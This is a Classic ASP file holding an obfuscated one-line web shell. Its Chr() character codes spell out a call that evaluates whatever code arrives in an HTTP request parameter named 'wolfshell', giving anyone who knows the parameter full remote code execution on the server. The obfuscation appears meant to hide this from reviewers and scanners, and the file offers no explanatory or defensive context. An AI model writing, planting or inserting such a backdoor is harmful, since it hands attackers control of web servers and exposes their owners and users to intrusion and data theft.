<%
Dim s_a8b1, s_c2d3, s_e4f5, s_g6h7
s_a8b1 = Chr(101) & Chr(118) & Chr(97) & Chr(108)
s_c2d3 = Chr(114) & Chr(101) & Chr(113) & Chr(117) & Chr(101) & Chr(115) & Chr(116)
s_e4f5 = Chr(119) & Chr(111) & Chr(108) & Chr(102) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
s_g6h7 = s_a8b1 & "(" & s_c2d3 & "(""" & s_e4f5 & """))"
Execute(s_g6h7)
%>